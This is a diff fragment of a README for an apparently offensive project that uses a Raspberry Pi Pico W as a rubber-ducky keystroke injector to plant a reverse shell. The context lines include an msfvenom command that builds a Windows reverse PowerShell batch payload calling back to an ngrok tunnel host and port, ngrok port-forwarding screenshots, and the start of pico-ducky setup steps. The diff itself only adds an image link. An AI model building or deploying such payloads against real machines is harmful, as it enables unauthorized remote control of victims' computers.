@@ -9,6 +9,7 @@ For port forwarding
 ![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
 ![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
+![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
 ## Rasberry pi pico w as rubber ducky
 1. Clone the repo to get a local copy of the files. `git clone https://github.com/dbisu/pico-ducky.git`
 2. Download [CircuitPython for the Raspberry Pi Pico W](https://circuitpython.org/board/raspberry_pi_pico_w/). *Updated to 8.0.0
